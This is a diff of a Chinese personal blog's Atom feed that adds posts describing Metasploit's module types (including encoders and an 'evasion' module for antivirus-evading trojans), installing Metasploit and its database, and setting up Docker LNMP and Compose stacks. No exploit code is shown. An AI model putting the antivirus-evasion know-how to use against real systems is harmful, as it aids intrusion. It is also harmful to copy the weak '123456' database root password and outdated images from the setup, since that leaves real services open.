+<h1 id="2-payloads漏洞负载模块">2. payloads(漏洞负载模块)</h1>
+<p><em>入侵要做什么</em></p>
+<ul>
+<li>入侵之后要使用的模块，是在渗透攻击成功后促使目标系统运行的一段植入代码，通常作用是为渗透攻击者打开在目标系统上的控制会话连接。此模块分为独立(Singles),传输器(Stager),传输体(Stage)三种类型。</li>
+</ul>
+<hr>
+<h1 id="3-auxiliary辅助模块">3. auxiliary(辅助模块)</h1>
+<p><em>一般是没有攻击载荷的漏洞攻击</em></p>
+<ul>
+<li>不属于入侵，用于信息收集以及一些不需要payload的攻击，像DOS，爆破，注入，爬虫，信息收集，资源嗅探等等。此模块的命名规则：模块(可有可无)/系统(可有可无)/服务/名称。</li>
+</ul>
+<hr>
+<h1 id="4-encoders编码器模块">4. encoders(编码器模块)</h1>
+<p><em>用于msfvenom -e or msf执行时也能用的shellcode编码</em></p>
+<ul>
+<li>一种编码转码模块，能够确保攻击载荷中不会出现渗透攻击过程中应加以避免的“坏字符”，还能对攻击模块实现免杀，躲过入侵检测和过滤系统。</li>
+<li>像典型的坏字符0x00，会截断后面的内容，从而使攻击载荷无法运行。</li>
+</ul>
+<hr>
+<h1 id="5-nops无操作生成器模块">5. nops(无操作生成器模块)</h1>
+<p><em>用来在攻击中添加空指令区，以提高攻击的可靠性</em></p>
+<hr>
+<h1 id="6-post开发模块">6. post(开发模块)</h1>
+<ul>
+<li>主要支持在渗透攻击取得目标系统远程控制权之后，在受控系统中进行各式各样的后渗透攻击动作，比如获取敏感信息，进一步扩展，实现跳板攻击等等</li>
+</ul>
+<hr>
+<h1 id="7-evasion">7. evasion</h1>
+<p><em>新模块，主要用于免杀</em></p>
+<ul>
+<li>MSF 5.0 中更新的一个新的模块，使用这个模块可以轻松创建反杀毒软件的木马。</li>
+</ul>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[# Linux无网络解决]]></title>
-        <id>https://kite-007.github.io/linux-wu-wang-luo-jie-jue/</id>
-        <link href="https://kite-007.github.io/linux-wu-wang-luo-jie-jue/">
+        <title type="html"><![CDATA[# MSF渗透工具(一)]]></title>
+        <id>https://kite-007.github.io/msf-shen-tou-gong-ju-yi/</id>
+        <link href="https://kite-007.github.io/msf-shen-tou-gong-ju-yi/">
         </link>
-        <updated>2021-03-08T00:41:59.000Z</updated>
-        <content type="html"><![CDATA[<ol>
-<li>ifconfig没有类似eth0一项<br>
-<img src="https://kite-007.github.io/post-images/1615164253722.png" alt="" loading="lazy">
+        <updated>2021-03-29T00:18:00.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>MSF 介绍</strong>:<em>MSF 的全称为Metasploit，是一个免费的，可下载的框架，通过它我们可以很容易的获取、开发并对计算机软件漏洞实施攻击。它本身含有数百个已知软件漏洞的专业级漏洞攻击工具。</em></p>
+<p><strong>MSF的安装：</strong></p>
 <ul>
-<li>使用cd,切换到目录/etc/sysconfig/network-scripts/</li>
-</ul>
-<pre><code>cd /etc/sysconfig/network-scripts/
-</code></pre>
+<li>下载地址：<a href="https://www.metasploit.com/download">https://www.metasploit.com/download</a>
 <ul>
-<li>使用ll ifcfg-*,查看此目录文件,是否存在ifcfg-[eth0]和ifcfg- lo两项</li>
-<li>如果不存在ifcfg-[eth0],则用cp ifcfg-lo ifcfg-[eth0]拷贝一份，并修改参数</li>
-</ul>
-<pre><code>ll ifcfg-*
-cp ifcfg-lo ifcfg-[eth0]
-</code></pre>
-<ul>
-<li>ifcfg-[eth0]</li>
-</ul>
-<pre><code>TYPE=&quot;Ethernet&quot;
-PROXY_METHOD=&quot;none&quot;
-BROWSER_ONLY=&quot;no&quot;
-BOOTPROTO=&quot;dhcp&quot;
-DEFROUTE=&quot;yes&quot;
-IPV4_FAILURE_FATAL=&quot;no&quot;
-IPV6INIT=&quot;yes&quot;
-IPV6_AUTOCONF=&quot;yes&quot;
-IPV6_DEFROUTE=&quot;yes&quot;
-IPV6_FAILURE_FATAL=&quot;no&quot;
-IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;
-NAME=&quot;ens33&quot;
-UUID=&quot;71c5edbc-7820-4bbf-9923-16d337ccc4ee&quot;
-DEVICE=&quot;ens33&quot;
-ONBOOT=&quot;yes&quot;
-HWADDR=00:0c:29:4a:63:77
-</code></pre>
-<ul>
-<li>ifcfg-lo</li>
-</ul>
-<pre><code>DEVICE=lo
-IPADDR=127.0.0.1
-NETMASK=255.0.0.0
-NETWORK=127.0.0.0
-# If you're having problems with gated making 127.0.0.0/8 a martian,
-# you can change this to something else (255.255.255.255, for example)
-BROADCAST=127.255.255.255
-ONBOOT=yes
-NAME=loopback
-</code></pre>
-<ul>
-<li>ifconfig [eth0] 192.168.XXX.XXX,给它指定ip</li>
-<li>ip addr 查看mac地址，</li>
-<li>vi ifcfg-[eth0],查看此文件内容，修改为静态或动态<br>
-这个是网络配置参数：<br>
-* BOOTPROTO=static   静态IP<br>
-* BOOTPROTO=dhcp   动态IP<br>
-* BOOTPROTO=none   无（不指定）<br>
-静态下方添加<br>
-* IPADDR=静态IP地址<br>
-* GATEWAY=默认网关<br>
-* NETMASK=255.255.255.0<br>
-* DNS1=114.114.114.114<br>
-查看是否有HWADDR=xx:xx:xx:xx:xx:xx一项<br>
-* 如果没有，将刚才ip addr所查看到的内容添加进去</li>
-<li>在 /etc/sysconfig/network-scripts目录下删除掉别的ifcfg-xxx(只保留一个你网卡同名的文档)再把NetworkManager停用</li>
-</ul>
-<pre><code>    systemctl stop NetworkManager
-    systemctl disable NetworkManager
-</code></pre>
-<ul>
-<li>之后再执行 systemctl restart network启用网络</li>
+<li>(Windows下有一些功能使用不了，所以推荐Linux。)</li>
+<li>Linux这里有两种安装方式：</li>
 </ul>
 </li>
+</ul>
+<ol>
+<li>使用指令安装</li>
+</ol>
+<pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \
+  chmod 755 msfinstall &amp;&amp; \
+  ./msfinstall
+</code></pre>
+<ol start="2">
+<li>使用下载好的压缩文件。</li>
 </ol>
 <ul>
-<li>其余关于NetworkManager的命令
-<ul>
-<li>执行以下命令检查Network或NetworkManager的运行状态。</li>
+<li><img src="https://kite-007.github.io/post-images/1617019530353.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617019487323.png" alt="" loading="lazy"></li>
+<li>切换到压缩文件存放的当前目录，解包安装，切换到该目录运行测试。</li>
 </ul>
-<pre><code>    systemctl status network
-    systemctl status NetworkManager
+<pre><code>sudo dpkg -i ./metasploit-framework_6.0.38+20210329102531~1rapid7-1_amd64.deb 
+
+# 切换到该安装目录
+cd /opt/metasploit-framework/bin
+
+# kali里面的目录
+cd /usr/share/metasploit-framework/bin
+
+# 打开MSF测试
+./msfconsole | msfconsole
+
+# MSF更新命令
+msfupdate
 </code></pre>
 <ul>
-<li>执行以下命令关闭network。</li>
+<li>开始时会问是否使用数据库，选择是(这样会大大提高搜索文件的速度，没问也没关系)。</li>
 </ul>
-<pre><code>    systemctl stop network
-    systemctl disable network
+<ol start="3">
+<li>MSF之postgresql数据库<br>
+<em>postgresql是MSF所使用的数据库，数据库的配置文件在；~/用户/.msf4。安装时会默认创建数据库的账号密码，默认为：账号:MSF@密码:MSF@数据库:MSF（普通权限），也可以自己新建账号或者密码，然后修改XML配置文件</em></li>
+</ol>
+<pre><code class="language-shell"># XML配置文件目录
+cd /home/用户/.msf4
+vim ./database.yml
+
+# 查看是否连接数据库
+db_status
+
+# 连接数据库
+db_connect  【参数】
+
+# 历史扫描文件的路径（导入）
+db_import
+
+# 只查看扫描的ip地址
+hosts -c address
 </code></pre>
 <ul>
-<li>执行以下命令开启NetworkManager，</li>
+<li>如果刚刚没有出现创建数据库的提示，在这里切换到普通用户进入MSF的安装目录。</li>
 </ul>
-<pre><code>    systemctl start NetworkManager
-    systemctl enable NetworkManager
+<pre><code class="language-shell">cd /opt/metasploit-framework/bin
+
+# 查看数据库命令帮助
+./msfdb
+
+# 初始化组件
+* init     initialize the component
+
+# 重新初始化删除并重新初始化组件
+* reinit   delete and reinitialize the component
+
+# 删除并停止组件
+* delete   delete and stop the component
+
+#状态检查组件状态
+* status   check component status
+
+# 启动组件
+* start    start the component
+
+# 停止组件
+* stop     stop the component
+
+# 重新启动组件
+* restart  restart the component
 </code></pre>
-</li>
+<pre><code class="language-shell"># 这里启用初始化数据库设置账户密码为MSF
+msfdb init
+
+# 启动数据库
+msfdb start
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[# Docker搭建LNMP环境（CentOS-7）]]></title>
+        <id>https://kite-007.github.io/docker-da-jian-lnmp-huan-jing/</id>
+        <link href="https://kite-007.github.io/docker-da-jian-lnmp-huan-jing/">
+        </link>
+        <updated>2021-03-27T13:52:18.000Z</updated>
+        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
+<li><a href="#1-mysql56">1. MySQL:5.6</a></li>
+<li><a href="#2-php55-fpm">2. php:5.5-fpm</a></li>
+<li><a href="#3-nginx1103">3. nginx:1.10.3</a></li>
 </ul>
+(Docker)</p>
+<h1 id="1-mysql56">1. MySQL:5.6</h1>
+<ol>
+<li>拉取镜像</li>
+</ol>
+<pre><code class="language-shell"># 拉取5.6版本的MySQL比较稳定
+docker pull mysql:5.6
+
+# 查看刚刚拉取的镜像
+docker images
+</code></pre>
+<ol start="2">
+<li>创建并启动容器</li>
+</ol>
+<pre><code class="language-shell">docker run -id -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 --name=mysql mysql:5.6
+# 其实这里为了方便相比于部署那篇已经少了挂载容器的内容
+</code></pre>
+<ol start="3">
+<li>测试</li>
+</ol>
+<pre><code class="language-shell">docker exec -it mysql /bin/bash
+</code></pre>
+<h1 id="2-php55-fpm">2. php:5.5-fpm</h1>
+<ol>
+<li>拉取镜像</li>
+</ol>
+<pre><code class="language-shell"># 拉取5.5版本的PHP比较稳定
+docker pull php:5.5-fpm
+
+# 查看刚刚拉取的镜像
+docker images
+</code></pre>
+<ol start="2">
+<li>创建并启动容器</li>
+</ol>
+<pre><code class="language-shell">docker run -id -v /var/nginx/www/html:/var/www/html -p 9000:9000 --link mysql:mysql --name=phpfpm php:5.5-fpm 
+# –link 与另外一个容器建立起联系，这样我们就可以在当前容器中去使用另一个容器里的服务。
+
+docker-php-ext-install pdo_mysql
+# 因为后面我要使用pdo模块进行测试，所以我需要自己安装pdo_mysql模块，在docker容器中可以这样来安装
+
+# 然后我们可以通过命令php -m查看我们的php的所有扩展模块，我们可以去看到我们刚刚安装的pdo_mysql扩展也在里面
+
+</code></pre>
+<h1 id="3-nginx1103">3. nginx:1.10.3</h1>
+<ol>
+<li>拉取镜像</li>
+</ol>
+<pre><code class="language-shell">docker pull nginx:1.10.3
+docker images
+</code></pre>
+<ol start="2">
+<li>创建并启动容器</li>
+</ol>
+<pre><code class="language-shell">docker run -id -p 80:80 --name=nginx \
+-v /var/nginx/www/html:/var/www/html \
+--link phpfpm:phpfpm --name=nginx nginx:1.10.3
+
+# 然后进入nginx容器，修改nginx的配置文件让它支持php
+docker exec -ti xy_nginx /bin/bash
+
+location ~ \.php$ {
+        root           /var/www/html;
+        fastcgi_index  index.php;
+        fastcgi_pass   phpfpm:9000;//这里改成我们之前--link进来的容器，也可以直接用php容器的ip
+	    fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        //如果你的根目录和php容器的根目录不一样，这里的$document_root需要换成你php下的根目录，不然php就找不到文件了
+        include        fastcgi_params;     
+    }
+</code></pre>
+<ol start="3">
+<li>测试</li>
+</ol>
+<pre><code class="language-php">&lt;?php
+try {
+    $con = new PDO('mysql:host=mysql;dbname=test', 'root', '123456');
+    $con-&gt;query('SET NAMES UTF8');
+    $res =  $con-&gt;query('select * from test');
+    while ($row = $res-&gt;fetch(PDO::FETCH_ASSOC)) {
+        echo &quot;id:{$row['id']} name:{$row['name']}&quot;;
+    }
+} catch (PDOException $e) {
+     echo '错误原因：'  . $e-&gt;getMessage();
+}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[# Docker服务编排（CentOS-7）*]]></title>
+        <id>https://kite-007.github.io/docker-fu-wu-bian-pai-centos-7/</id>
+        <link href="https://kite-007.github.io/docker-fu-wu-bian-pai-centos-7/">
+        </link>
+        <updated>2021-03-27T12:44:16.000Z</updated>
+        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
+<li><a href="#1-%E6%9C%8D%E5%8A%A1%E7%BC%96%E6%8E%92%E6%A6%82%E5%BF%B5">1. 服务编排概念</a></li>
+<li><a href="#2-docker-compose">2. Docker Compose</a></li>
+</ul>
+(TOC)</p>
+<h1 id="1-服务编排概念">1. 服务编排概念</h1>
+<ul>
+<li>微服务架构的应用系统中一般包含若干个微服务，每个微服务一般都会部署多个实例，如果每个微服务都要手动启停，维护的工作量会很大。<br>
+• 要从Dockerfile build image 或者去dockerhub拉取image<br>
+• 要创建多个container<br>
+• 要管理这些container（启动停止删除）</li>
+</ul>
+<p><strong>服务编排</strong>：按照一定的业务规则批量管理容器</p>
+<ul>
+<li>Docker Compose是一个编排多容器分布式部署的工具，提供命令集管理容器化应用的完整开发周期，包括服务构建，启动和停止。使用步骤：</li>
+</ul>
+<ol>
+<li>利用 Dockerfile 定义运行环境镜像</li>
+<li>使用 docker-compose.yml 定义组成应用的各服务</li>
+<li>运行 docker-compose up 启动应用</li>
+</ol>
+<h1 id="2-docker-compose">2. Docker Compose</h1>
+<p>一、安装Docker Compose</p>
+<pre><code class="language-shell"># Compose目前已经完全支持Linux、Mac OS和Windows，在我们安装Compose之前，需要先安装Docker。下面我 们以编译好的二进制包方式安装在Linux系统中。 
+curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose
+# 设置文件可执行权限 
+chmod +x /usr/local/bin/docker-compose
+# 查看版本信息 
+docker-compose -version
+</code></pre>
+<p>二、卸载Docker Compose</p>
+<pre><code class="language-shell"># 二进制包方式安装的，删除二进制文件即可
+rm /usr/local/bin/docker-compose
+</code></pre>
+<p>三、 使用docker compose编排nginx+springboot项目</p>
+<ol>
+<li>创建docker-compose目录</li>
+</ol>
+<pre><code class="language-shell">mkdir ~/docker-compose
+cd ~/docker-compose
+</code></pre>
+<ol start="2">
+<li>编写 docker-compose.yml 文件</li>
+</ol>
+<pre><code class="language-shell">version: '3'
+services:
+  nginx:
+   image: nginx
+   ports:
+    - 80:80
+   links:
+    - app
+   volumes:
+    - ./nginx/conf.d:/etc/nginx/conf.d
+  app:
+    image: app
+    expose:
+      - &quot;8080&quot;
+</code></pre>
+<ol start="3">
+<li>创建./nginx/conf.d目录</li>
+</ol>
+<pre><code class="language-shell">mkdir -p ./nginx/conf.d
+</code></pre>
+<ol start="4">
+<li>在./nginx/conf.d目录下 编写itheima.conf文件</li>
+</ol>
+<pre><code class="language-shell">server {
+    listen 80;
+    access_log off;
+
+    location / {
+        proxy_pass http://app:8080;
+    }
+   
+}
+</code></pre>
+<ol start="5">
+<li>在~/docker-compose 目录下 使用docker-compose 启动容器</li>
+</ol>
+<pre><code class="language-shell">docker-compose up
+</code></pre>
+<ol start="6">
+<li>测试访问</li>
+</ol>
 ]]></content>
     </entry>
 </feed>
